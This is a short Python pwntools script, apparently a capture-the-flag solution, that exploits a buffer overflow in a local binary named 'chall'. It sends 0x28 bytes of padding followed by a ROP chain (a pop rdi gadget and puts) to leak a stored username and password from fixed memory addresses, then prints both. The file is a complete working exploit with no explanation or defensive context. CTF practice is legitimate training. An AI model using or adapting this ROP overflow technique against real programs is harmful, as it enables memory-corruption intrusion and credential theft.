from pwn import *

file = "./chall"
e = ELF(file)
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

command = '''
'''

rop_pop_rdi = 0x00400b03
addr_username = 0x006020c0
addr_passwd = 0x006020e0

io = process(file)
pld = b"A"*0x28
pld += p64(rop_pop_rdi)
pld += p64(addr_username)
pld += p64(e.plt['puts'])

io.send(pld[:-1])
io.shutdown('send')
io.recvuntil(b"Password: ")
username = io.recvall()[:-2]
io.close()

io = process(file)
pld = b"B"*0x28
pld += p64(rop_pop_rdi)
pld += p64(addr_passwd)
pld += p64(e.plt['puts'])

io.send(pld[:-1])
io.shutdown('send')
io.recvuntil(b"Password: ")
passwd = io.recvall()[:-2]
io.close()

print(f'Username: {username}')
print(f'Password: {passwd}')

io.interactive()
